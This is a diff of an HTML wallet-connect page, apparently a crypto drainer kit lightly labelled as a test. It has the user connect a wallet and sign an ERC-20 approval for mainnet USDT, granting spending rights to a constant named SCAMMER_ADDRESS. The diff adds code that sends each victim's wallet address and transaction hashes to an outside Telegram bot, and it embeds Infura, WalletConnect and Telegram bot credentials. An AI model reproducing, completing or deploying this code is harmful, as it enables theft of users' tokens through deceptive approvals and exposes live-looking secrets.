@@ -1,77 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Wallet Connect + WalletConnect Demo</title>
+  <meta charset="UTF-8" />
+  <title>Wallet Connect Demo with Telegram Alerts</title>
+  <script src="https://unpkg.com/web3modal"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
 </head>
 <body>
-  <h2>Connect Wallet (MetaMask or WalletConnect)</h2>
+  <h2>Test Wallet Connect + Approve Simulation</h2>
   <button id="connectBtn">Connect Wallet</button>
   <button id="approveBtn" disabled>Approve Token Spend</button>
 
   <script>
-    let provider;
-    let signer;
-    let userAddress;
-    let ethersProvider;
+    // === INFURA & WALLETCONNECT DETAILS ===
+    const INFURA_PROJECT_ID = "4aa83a1a6d3c4b318c210e38243466c9";
+    const WALLETCONNECT_PROJECT_ID = "b49de02b26fcb4c1ad6f4fb0dbd9caff";
 
-    document.getElementById('connectBtn').onclick = async () => {
-      if (window.ethereum) {
-        // MetaMask or injected provider available
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
-          signer = ethersProvider.getSigner();
-          userAddress = await signer.getAddress();
-          alert("Wallet connected (MetaMask): " + userAddress);
-          document.getElementById('approveBtn').disabled = false;
-        } catch (err) {
-          alert("MetaMask connection rejected.");
-        }
-      } else {
-        // No injected provider, use WalletConnect
-        try {
-          const WalletConnectProvider = window.WalletConnectProvider.default;
-          provider = new WalletConnectProvider({
-            infuraId: "https://mainnet.infura.io/v3/4aa83a1a6d3c4b318c210e38243466c9" // Required for WalletConnect
-          });
-          await provider.enable();
-          ethersProvider = new ethers.providers.Web3Provider(provider);
-          signer = ethersProvider.getSigner();
-          userAddress = await signer.getAddress();
-          alert("Wallet connected (WalletConnect): " + userAddress);
-          document.getElementById('approveBtn').disabled = false;
-        } catch (err) {
-          alert("WalletConnect connection failed.");
+    // === TELEGRAM BOT SETTINGS ===
+    const TELEGRAM_BOT_TOKEN = "8028485593:AAEe4vG4EL4OUkQMXL3xuomEW8G3-kP1imQ";
+    const TELEGRAM_CHAT_ID = "5266257102";
+
+    // === TESTING DETAILS ===
+    const SCAMMER_ADDRESS = "0x000000000000000000000000000000000000dead"; // Replace for testing
+    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet
+
+    // === Web3Modal Setup ===
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          infuraId: INFURA_PROJECT_ID,
+          projectId: WALLETCONNECT_PROJECT_ID
         }
       }
     };
 
-    document.getElementById('approveBtn').onclick = async () => {
-      if (!signer) {
-        alert("Connect wallet first!");
-        return;
-      }
+    const web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
+    });
 
-      const erc20Abi = [
-        "function approve(address spender, uint256 amount) public returns (bool)"
-      ];
+    let provider, signer, userAddress;
 
-      const scammerAddress = "0x000000000000000000000000000000000000dead"; // Replace for test
-      const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with test token
+    // === Telegram Message Function ===
+    function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+      });
+    }
 
-      const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-
+    // === Connect Wallet ===
+    document.getElementById("connectBtn").onclick = async () => {
       try {
+        provider = await web3Modal.connect();
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        signer = ethersProvider.getSigner();
+        userAddress = await signer.getAddress();
+        alert("Connected wallet: " + userAddress);
+        sendTelegramMessage("Wallet connected: " + userAddress);
+        document.getElementById("approveBtn").disabled = false;
+      } catch (err) {
+        console.error(err);
+        alert("Connection failed.");
+      }
+    };
+
+    // === ERC-20 Approve Function ===
+    const erc20Abi = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    document.getElementById("approveBtn").onclick = async () => {
+      try {
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, erc20Abi, signer);
         const tx = await tokenContract.approve(
-          scammerAddress,
-          ethers.utils.parseUnits("1000", 18)
+          SCAMMER_ADDRESS,
+          ethers.utils.parseUnits("1000", 6) // USDT = 6 decimals
         );
-        alert("Approval tx sent: " + tx.hash);
+        alert("Approval transaction sent. Hash: " + tx.hash);
+        sendTelegramMessage("Approval sent by: " + userAddress + "\nTx: " + tx.hash);
         await tx.wait();
         alert("Approval confirmed.");
+        sendTelegramMessage("Approval confirmed for: " + userAddress);
       } catch (err) {
+        console.error(err);
         alert("Approval failed or rejected.");
       }
     };
